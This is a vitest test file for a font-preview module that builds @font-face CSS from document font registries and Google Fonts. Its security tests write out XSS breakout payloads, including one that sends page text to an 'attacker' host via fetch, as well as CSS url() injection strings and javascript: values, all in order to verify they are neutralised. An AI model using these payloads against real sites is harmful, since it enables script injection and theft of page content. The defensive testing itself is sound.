import { describe, it, expect } from 'vitest';
import {
  extractFontRegistries,
  synthesizedFamilyNames,
  facesFromRegistryEntry,
  googleFamiliesFor,
  buildGoogleCss2Href,
  parseGoogleCss,
  renderFontFaceCss,
  collectReferencedWeights,
  buildPreviewFontAssets,
  fetchGoogleFacesRewritten,
  type PreviewFontFace,
} from '../preview-fonts';
import type { FontRegistryEntry } from '@json-to-office/shared';

const dataEntry = (weight = 400): FontRegistryEntry => ({
  id: 'brand',
  family: 'Brand Sans',
  sources: [{ kind: 'data', data: 'AAAA', weight }],
});

describe('extractFontRegistries', () => {
  it('reads props.fontRegistry from the document text', () => {
    const json = JSON.stringify({ props: { fontRegistry: [dataEntry()] } });
    expect(extractFontRegistries(json, undefined)).toHaveLength(1);
  });

  it('reads fontRegistry from custom themes', () => {
    const themes = { branded: { fontRegistry: [dataEntry()] } };
    expect(extractFontRegistries(undefined, themes)).toHaveLength(1);
  });

  it('lets the document win over a theme on the same family', () => {
    const json = JSON.stringify({
      props: {
        fontRegistry: [
          {
            id: 'brand',
            family: 'Brand Sans',
            sources: [{ kind: 'data', data: 'DOC' }],
          },
        ],
      },
    });
    const themes = {
      t: {
        fontRegistry: [
          {
            id: 'brand',
            family: 'Brand Sans',
            sources: [{ kind: 'data', data: 'THEME' }],
          },
        ],
      },
    };
    const out = extractFontRegistries(json, themes);
    expect(out).toHaveLength(1);
    expect((out[0].sources[0] as { data: string }).data).toBe('DOC');
  });

  it('returns empty for a mid-edit document that is not valid JSON', () => {
    expect(extractFontRegistries('{ "props": ', undefined)).toEqual([]);
  });

  it('returns empty when there is no registry at all', () => {
    expect(extractFontRegistries('{"props":{}}', {})).toEqual([]);
  });
});

describe('synthesizedFamilyNames', () => {
  it('keeps 400 and 700 on the canonical family (RIBBI)', () => {
    expect(synthesizedFamilyNames('Inter', 400, false)).toEqual([
      { family: 'Inter', cssWeight: 400, cssStyle: 'normal' },
    ]);
    expect(synthesizedFamilyNames('Inter', 700, false)).toEqual([
      { family: 'Inter', cssWeight: 700, cssStyle: 'normal' },
    ]);
  });

  it('adds a synthetic sub-family at 400/normal for other canonical weights', () => {
    // This is the whole point: core-docx emits "Inter Light" with no bold
    // toggle, and docx-preview only ever asks for bold|normal.
    expect(synthesizedFamilyNames('Inter', 300, false)).toEqual([
      { family: 'Inter', cssWeight: 300, cssStyle: 'normal' },
      { family: 'Inter Light', cssWeight: 400, cssStyle: 'normal' },
    ]);
  });

  it('folds italic into the synthetic name', () => {
    expect(synthesizedFamilyNames('Inter', 600, true)).toEqual([
      { family: 'Inter', cssWeight: 600, cssStyle: 'italic' },
      { family: 'Inter SemiBold Italic', cssWeight: 400, cssStyle: 'normal' },
    ]);
  });

  it('emits no synthetic name for a non-canonical weight', () => {
    // 450 has no WEIGHT_LABELS entry, so core falls back to the bold-only
    // heuristic and never produces a sub-family name.
    expect(synthesizedFamilyNames('Inter', 450, false)).toEqual([
      { family: 'Inter', cssWeight: 450, cssStyle: 'normal' },
    ]);
  });
});

describe('facesFromRegistryEntry', () => {
  it('wraps bare base64 as a data URL', () => {
    const [face] = facesFromRegistryEntry(dataEntry());
    expect(face.url).toBe('data:font/ttf;base64,AAAA');
  });

  it('passes a data: URL through verbatim', () => {
    const [face] = facesFromRegistryEntry({
      id: 'b',
      family: 'B',
      sources: [{ kind: 'data', data: 'data:font/otf;base64,ZZZZ' }],
    });
    expect(face.url).toBe('data:font/otf;base64,ZZZZ');
  });

  it('skips safe, file, and google sources', () => {
    expect(
      facesFromRegistryEntry({
        id: 'x',
        family: 'X',
        sources: [
          { kind: 'safe', family: 'Arial' },
          { kind: 'file', path: './x.ttf' },
          { kind: 'google', family: 'Inter' },
        ],
      })
    ).toEqual([]);
  });

  it('drops a url source outside the host allowlist', () => {
    expect(
      facesFromRegistryEntry({
        id: 'evil',
        family: 'Evil',
        sources: [{ kind: 'url', url: 'https://evil.example.com/f.ttf' }],
      })
    ).toEqual([]);
  });

  it('keeps an allowlisted url source', () => {
    const faces = facesFromRegistryEntry({
      id: 'ok',
      family: 'Ok',
      sources: [{ kind: 'url', url: 'https://cdn.jsdelivr.net/f.ttf' }],
    });
    expect(faces).toHaveLength(1);
    expect(faces[0].url).toContain('cdn.jsdelivr.net');
  });

  it('marks variable sources so synthetic rules can pin the axis', () => {
    const faces = facesFromRegistryEntry({
      id: 'v',
      family: 'V',
      sources: [
        {
          kind: 'variable',
          url: 'https://cdn.jsdelivr.net/v.ttf',
          weight: 300,
        },
      ],
    });
    expect(faces[0].variable).toBe(true);
  });
});

describe('googleFamiliesFor', () => {
  it('matches catalog families case-insensitively and skips safe fonts', () => {
    const out = googleFamiliesFor(
      new Set(['inter', 'Arial', 'Not A Real Font']),
      [],
      new Set()
    );
    expect(out.map((g) => g.family)).toEqual(['Inter']);
  });

  it('does not re-fetch a weight the registry already supplies', () => {
    const out = googleFamiliesFor(
      new Set(['Inter']),
      [{ id: 'i', family: 'Inter', sources: [{ kind: 'data', data: 'AA' }] }],
      new Set()
    );
    // The entry supplies 400 (the default), so only 700 is still missing.
    expect(out[0].weights).toEqual([700]);
  });

  it('narrows weights to those the document references, plus 400/700', () => {
    const out = googleFamiliesFor(new Set(['Inter']), [], new Set([300]));
    expect(out[0].weights).toContain(300);
    expect(out[0].weights).toContain(400);
    expect(out[0].weights).not.toContain(500);
  });
});

describe('buildGoogleCss2Href', () => {
  it('sorts weights ascending (the API 400s otherwise)', () => {
    expect(buildGoogleCss2Href('Inter', [700, 300, 400], false)).toBe(
      'https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap'
    );
  });

  it('groups ital tuples roman-then-italic', () => {
    expect(buildGoogleCss2Href('Inter', [400, 700], true)).toContain(
      'ital,wght@0,400;0,700;1,400;1,700'
    );
  });

  it('encodes spaces in the family name', () => {
    expect(buildGoogleCss2Href('Space Grotesk', [400], false)).toContain(
      'family=Space%20Grotesk'
    );
  });
});

describe('parseGoogleCss', () => {
  const CSS = `
/* latin */
@font-face {
  font-family: 'Inter';
  font-style: normal;
  font-weight: 300;
  src: url(https://fonts.gstatic.com/s/inter/v1/a.woff2) format('woff2');
  unicode-range: U+0000-00FF;
}
@font-face {
  font-family: 'Inter';
  font-style: italic;
  font-weight: 700;
  src: url(https://fonts.gstatic.com/s/inter/v1/b.woff2) format('woff2');
}`;

  it('extracts weight, style, src and unicode-range per block', () => {
    const faces = parseGoogleCss(CSS, 'Inter');
    expect(faces).toHaveLength(2);
    expect(faces[0]).toMatchObject({
      family: 'Inter',
      weight: 300,
      italic: false,
      unicodeRange: 'U+0000-00FF',
    });
    expect(faces[1]).toMatchObject({ weight: 700, italic: true });
  });

  it('ignores blocks without a src', () => {
    expect(parseGoogleCss('/* just a comment */', 'Inter')).toEqual([]);
  });
});

describe('renderFontFaceCss', () => {
  const face: PreviewFontFace = {
    family: 'Inter',
    weight: 300,
    italic: false,
    url: 'https://fonts.gstatic.com/a.woff2',
  };

  it('emits both the canonical and synthetic rules', () => {
    const css = renderFontFaceCss([face]);
    expect(css).toContain('font-family:"Inter";');
    expect(css).toContain('font-weight:300;');
    expect(css).toContain('font-family:"Inter Light";');
    // The synthetic name must be plain 400 or docx-preview will not select it.
    expect(css).toMatch(/font-family:"Inter Light";[^}]*font-weight:400;/);
  });

  it('pins the wght axis only on the synthetic rule of a variable font', () => {
    const css = renderFontFaceCss([{ ...face, variable: true }]);
    const [canonical, synthetic] = css.split('\n');
    expect(canonical).not.toContain('font-variation-settings');
    expect(synthetic).toContain('font-variation-settings:"wght" 300;');
  });

  it('de-dupes identical rules', () => {
    const css = renderFontFaceCss([face, { ...face }]);
    expect(css.split('@font-face').length - 1).toBe(2); // canonical + synthetic
  });

  it('carries unicode-range through', () => {
    const css = renderFontFaceCss([{ ...face, unicodeRange: 'U+0-FF' }]);
    expect(css).toContain('unicode-range:U+0-FF;');
  });

  it('escapes quotes in a family name', () => {
    const css = renderFontFaceCss([{ ...face, family: 'He said "hi"' }]);
    expect(css).toContain('\\"hi\\"');
  });

  it('drops rules past the byte budget instead of inflating srcdoc', () => {
    const css = renderFontFaceCss([face], 10);
    expect(css).toBe('');
  });
});

describe('collectReferencedWeights', () => {
  it('finds numeric fontWeight at any depth', () => {
    expect(
      collectReferencedWeights({
        children: [
          { props: { font: { fontWeight: 300 } } },
          { props: { font: { fontWeight: 600 } } },
          { props: { font: { fontWeight: 'bold' } } },
        ],
      })
    ).toEqual(new Set([300, 600]));
  });
});

describe('buildPreviewFontAssets', () => {
  it('emits registry faces without touching the network', async () => {
    const json = JSON.stringify({
      name: 'docx',
      props: { fontRegistry: [dataEntry(300)] },
      children: [{ props: { font: { family: 'Brand Sans' } } }],
    });
    const failFetch = (() => {
      throw new Error('should not fetch');
    }) as unknown as typeof fetch;

    const { css, googleHrefs } = await buildPreviewFontAssets(
      json,
      {},
      {
        fetchImpl: failFetch,
      }
    );
    expect(css).toContain('font-family:"Brand Sans";');
    expect(css).toContain('font-family:"Brand Sans Light";');
    expect(googleHrefs).toEqual([]);
  });

  it('falls back to a stylesheet link when the Google fetch fails', async () => {
    const json = JSON.stringify({
      name: 'docx',
      props: {},
      children: [{ props: { font: { family: 'Inter' } } }],
    });
    const failFetch = (async () => {
      throw new Error('offline');
    }) as unknown as typeof fetch;

    const { googleHrefs } = await buildPreviewFontAssets(
      json,
      {},
      {
        fetchImpl: failFetch,
      }
    );
    expect(googleHrefs).toHaveLength(1);
    expect(googleHrefs[0]).toContain('family=Inter');
  });

  it('rewrites fetched Google CSS under synthetic names', async () => {
    const json = JSON.stringify({
      name: 'docx',
      props: {},
      children: [{ props: { font: { family: 'Inter', fontWeight: 300 } } }],
    });
    const okFetch = (async () => ({
      ok: true,
      status: 200,
      text: async () =>
        "@font-face{font-family:'Inter';font-style:normal;font-weight:300;src:url(https://fonts.gstatic.com/a.woff2) format('woff2');}",
    })) as unknown as typeof fetch;

    const { css, googleHrefs } = await buildPreviewFontAssets(
      json,
      {},
      {
        fetchImpl: okFetch,
      }
    );
    expect(googleHrefs).toEqual([]);
    expect(css).toContain('font-family:"Inter Light";');
  });

  it('returns empty assets for an unparseable document', async () => {
    const { css, googleHrefs } = await buildPreviewFontAssets('{oops', {});
    expect(css).toBe('');
    expect(googleHrefs).toEqual([]);
  });
});

describe('a stalled Google Fonts fetch cannot hang the preview', () => {
  // render.ts awaits buildPreviewFontAssets *after* its 10s renderAsync race
  // has already settled, and nothing races renderDocument either — so an
  // unbounded fetch left the preview promise unsettled and the pane spinning
  // forever. Each test uses its own family so the module-level face cache,
  // keyed by href, cannot serve a neighbouring test's result.
  //
  // The timeout is injected at a few milliseconds: real timers, but nothing
  // that actually waits.
  const stalls = (): typeof fetch =>
    (() => new Promise(() => {})) as unknown as typeof fetch;

  it('rejects instead of hanging, and aborts the request', async () => {
    let signal: AbortSignal | undefined;
    const capture = ((_href: string, init?: RequestInit) => {
      signal = init?.signal ?? undefined;
      return new Promise(() => {});
    }) as unknown as typeof fetch;

    await expect(
      fetchGoogleFacesRewritten('Manrope', [400, 700], false, capture, 5)
    ).rejects.toThrow(/timed out/);
    expect(signal?.aborted).toBe(true);
  });

  it('times out a stalled body read as well as a stalled response', async () => {
    const headersOnly = (async () => ({
      ok: true,
      status: 200,
      text: () => new Promise(() => {}),
    })) as unknown as typeof fetch;

    await expect(
      fetchGoogleFacesRewritten('Rubik', [400, 700], false, headersOnly, 5)
    ).rejects.toThrow(/timed out/);
  });

  it('still resolves, via the stylesheet-link fallback', async () => {
    const json = JSON.stringify({
      name: 'docx',
      props: {},
      children: [{ props: { font: { family: 'Lora' } } }],
    });

    const { css, googleHrefs } = await buildPreviewFontAssets(
      json,
      {},
      { fetchImpl: stalls(), googleTimeoutMs: 5 }
    );

    // The plain link still covers 400/700 — degraded, but rendered.
    expect(googleHrefs).toHaveLength(1);
    expect(googleHrefs[0]).toContain('family=Lora');
    expect(css).toBe('');
  });

  it('does not poison the cache, so a later fetch can succeed', async () => {
    const ok = (async () => ({
      ok: true,
      status: 200,
      text: async () =>
        "@font-face{font-family:'Nunito';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/n.woff2) format('woff2');}",
    })) as unknown as typeof fetch;

    await expect(
      fetchGoogleFacesRewritten('Nunito', [400], false, stalls(), 5)
    ).rejects.toThrow(/timed out/);

    const faces = await fetchGoogleFacesRewritten(
      'Nunito',
      [400],
      false,
      ok,
      5
    );
    expect(faces).toHaveLength(1);
  });
});

describe('document-controlled strings cannot escape the <style> element', () => {
  // The generated CSS is assigned as the text of a <style> element and then
  // serialized with outerHTML for the preview iframe's srcdoc. <style> is HTML
  // raw text, so a literal `</style>` anywhere inside — even mid-string —
  // closes the element and everything after it is parsed as markup.
  const BREAKOUT = 'A</style><img src=x onerror=alert(1)>';

  it('neutralises </style> in a family name', () => {
    const css = renderFontFaceCss([
      {
        family: BREAKOUT,
        weight: 400,
        italic: false,
        url: 'data:font/ttf;base64,AA',
      },
    ]);
    expect(css).not.toContain('</style>');
    expect(css).not.toContain('<img');
    // Escaped as the CSS code point, which still resolves to the same family.
    expect(css).toContain('\\3c ');
  });

  it('neutralises </style> arriving through a registry entry end to end', () => {
    const faces = facesFromRegistryEntry({
      id: 'x',
      family: BREAKOUT,
      sources: [{ kind: 'data', data: 'AAAA' }],
    });
    expect(renderFontFaceCss(faces)).not.toContain('</style>');
  });

  it('rejects a data payload that tries to append a second source', () => {
    // `"),url("https://attacker/x.ttf` would otherwise close the url() and add
    // a source the host allowlist never saw.
    const faces = facesFromRegistryEntry({
      id: 'evil',
      family: 'Evil',
      sources: [
        {
          kind: 'data',
          data: 'data:font/ttf;base64,AA"),url("https://attacker.example/x.ttf',
        },
      ],
    });
    expect(faces).toEqual([]);
  });

  it('rejects a data payload outside the base64 alphabet', () => {
    expect(
      facesFromRegistryEntry({
        id: 'e',
        family: 'E',
        sources: [{ kind: 'data', data: 'javascript:alert(1)' }],
      })
    ).toEqual([]);
  });

  it('escapes a quote in an allowlisted url rather than trusting the host check', () => {
    // new URL() happily accepts a quote in the path, so an allowlisted host is
    // not on its own enough to interpolate the string unquoted.
    const css = renderFontFaceCss([
      {
        family: 'Q',
        weight: 400,
        italic: false,
        url: 'https://fonts.gstatic.com/a").url("https://attacker.example/x.ttf',
      },
    ]);
    // The quotes are escaped, so the second url( sits INSIDE the string
    // literal and is inert rather than becoming an un-allowlisted source.
    expect(css).not.toContain('"),url("');
    expect(css).toContain('a\\").url(\\"https');
  });

  it('drops a Google-derived src containing a angle bracket', () => {
    const css = renderFontFaceCss([
      { family: 'G', weight: 400, italic: false, src: 'url(x)</style><b>' },
    ]);
    expect(css).toBe('');
  });

  it('ignores a malformed unicode-range from the stylesheet', () => {
    const faces = parseGoogleCss(
      "@font-face{font-family:'I';font-weight:400;src:url(https://fonts.gstatic.com/a.woff2);unicode-range:</style><img>;}",
      'I'
    );
    expect(faces[0].unicodeRange).toBeUndefined();
  });
});

describe('embedding a font does not cost the family its other weights', () => {
  const embedded400: FontRegistryEntry = {
    id: 'Inter',
    family: 'Inter',
    sources: [{ kind: 'data', data: 'AAAA', weight: 400 }],
  };

  it('still fetches a referenced weight the registry does not supply', () => {
    // The Custom tab embeds 400/700; a fontWeight:500 run would otherwise
    // have no face at all, which is worse than before the font was added.
    const out = googleFamiliesFor(
      new Set(['Inter']),
      [embedded400],
      new Set([500])
    );
    expect(out).toHaveLength(1);
    expect(out[0].weights).toContain(500);
    expect(out[0].weights).not.toContain(400); // already has real bytes
  });

  it('skips the family entirely once every used weight has bytes', () => {
    const full: FontRegistryEntry = {
      id: 'Inter',
      family: 'Inter',
      sources: [
        { kind: 'data', data: 'A', weight: 400 },
        { kind: 'data', data: 'B', weight: 700 },
      ],
    };
    expect(googleFamiliesFor(new Set(['Inter']), [full], new Set())).toEqual(
      []
    );
  });

  it('leaves a non-catalog custom family alone', () => {
    const brand: FontRegistryEntry = {
      id: 'b',
      family: 'Acme Brand Sans',
      sources: [{ kind: 'data', data: 'A', weight: 400 }],
    };
    expect(
      googleFamiliesFor(new Set(['Acme Brand Sans']), [brand], new Set([500]))
    ).toEqual([]);
  });
});

describe('a source that yields no face never suppresses the Google fallback', () => {
  // Coverage used to be re-derived from the sources with looser rules than
  // facesFromRegistryEntry applies, so an entry that produces no usable
  // @font-face still marked its weight as supplied and the preview silently
  // lost the family altogether.
  const referenced = new Set(['Inter']);

  const expectStillFetched = (entry: FontRegistryEntry): void => {
    expect(facesFromRegistryEntry(entry)).toEqual([]);
    const out = googleFamiliesFor(referenced, [entry], new Set());
    expect(out).toHaveLength(1);
    expect(out[0].weights).toEqual([400, 700]);
  };

  it('still fetches when the only source is a server-side file path', () => {
    expectStillFetched({
      id: 'i',
      family: 'Inter',
      sources: [
        { kind: 'file', path: './Inter.ttf', weight: 400 },
        { kind: 'file', path: './Inter-Bold.ttf', weight: 700 },
      ],
    });
  });

  it('still fetches when the data payload fails the base64 grammar', () => {
    expectStillFetched({
      id: 'i',
      family: 'Inter',
      sources: [
        { kind: 'data', data: 'javascript:alert(1)', weight: 400 },
        {
          kind: 'data',
          data: 'AA"),url("https://attacker.example/x.ttf',
          weight: 700,
        },
      ],
    });
  });

  it('still fetches when the url is outside the host allowlist', () => {
    expectStillFetched({
      id: 'i',
      family: 'Inter',
      sources: [
        { kind: 'url', url: 'https://evil.example.com/i.ttf', weight: 400 },
        { kind: 'url', url: 'https://evil.example.com/b.ttf', weight: 700 },
      ],
    });
  });

  it('covers only the weights that survived, in a mixed entry', () => {
    const out = googleFamiliesFor(
      referenced,
      [
        {
          id: 'i',
          family: 'Inter',
          sources: [
            { kind: 'data', data: 'AAAA', weight: 400 },
            { kind: 'file', path: './Inter-Bold.ttf', weight: 700 },
          ],
        },
      ],
      new Set()
    );
    // 400 has real bytes; 700 only had a path the browser cannot read.
    expect(out[0].weights).toEqual([700]);
  });

  it('still counts an allowlisted url as real coverage', () => {
    expect(
      googleFamiliesFor(
        referenced,
        [
          {
            id: 'i',
            family: 'Inter',
            sources: [
              {
                kind: 'url',
                url: 'https://cdn.jsdelivr.net/i.ttf',
                weight: 400,
              },
              {
                kind: 'url',
                url: 'https://cdn.jsdelivr.net/b.ttf',
                weight: 700,
              },
            ],
          },
        ],
        new Set()
      )
    ).toEqual([]);
  });
});

describe('the reported break-out, through the public entry point', () => {
  it('produces CSS that cannot close the <style> element', async () => {
    // Verbatim shape from the review finding: an unreferenced registry entry
    // is still emitted, so the document does not even need to use the font.
    const json = JSON.stringify({
      name: 'docx',
      props: {
        fontRegistry: [
          {
            id: 'a',
            family:
              "A</style><img src=x onerror=fetch('https://attacker/'+encodeURIComponent(document.body.innerText))>",
            sources: [{ kind: 'data', data: 'AA' }],
          },
        ],
      },
      children: [],
    });
    const failFetch = (async () => {
      throw new Error('no network');
    }) as unknown as typeof fetch;

    const { css } = await buildPreviewFontAssets(
      json,
      {},
      {
        fetchImpl: failFetch,
      }
    );

    // The CSS becomes the text of a <style>, which HTML serializes verbatim.
    // The payload survives as inert text — that is fine and expected. What
    // matters is that no `<` survives unescaped, so no tag can ever form:
    // "onerror" is only dangerous once something opens an element.
    expect(css).not.toContain('<');
    expect(css).toContain('\\3c /style>');
    // Serialized into a <style>, exactly one closing tag exists: ours.
    const serialized = `<style>${css}</style>`;
    expect(serialized.match(/<\/style>/g)).toHaveLength(1);
  });
});
